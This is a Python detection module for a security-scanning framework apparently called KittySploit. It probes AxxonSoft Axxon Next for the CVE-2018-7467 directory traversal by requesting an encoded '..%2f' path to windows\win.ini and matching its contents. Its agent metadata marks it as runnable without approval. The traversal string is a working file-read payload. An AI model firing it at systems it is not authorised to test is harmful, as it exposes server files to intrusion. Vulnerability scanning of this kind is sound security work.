#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AxxonSoft Axxon Next suffers from a local file inclusion vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AxxonSoft Axxon Next - Local File Inclusion Detection',
        'description': 'AxxonSoft Axxon Next suffers from a local file inclusion vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'axxonsoft', 'lfi', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/146604/AxxonSoft-Axxon-Next-Directory-Traversal.html',
            'https://github.com/sullo/advisory-archives/blob/master/axxonsoft-next-CVE-2018-7467.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-7467',
            'http://www.projectxit.com.au/blog/2018/2/27/axxonsoft-client-directory-traversal-cve-2018-7467-axxonsoft-axxon-next-axxonsoft-client-directory-traversal-via-an-initial-css2f-substring-in-a-uri-cve-2018-7467',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-7467',
    }

    def run(self):
        path = '//css//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\\win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='AxxonSoft Axxon Next - Local File Inclusion detected', path=path)
            return True
        return False

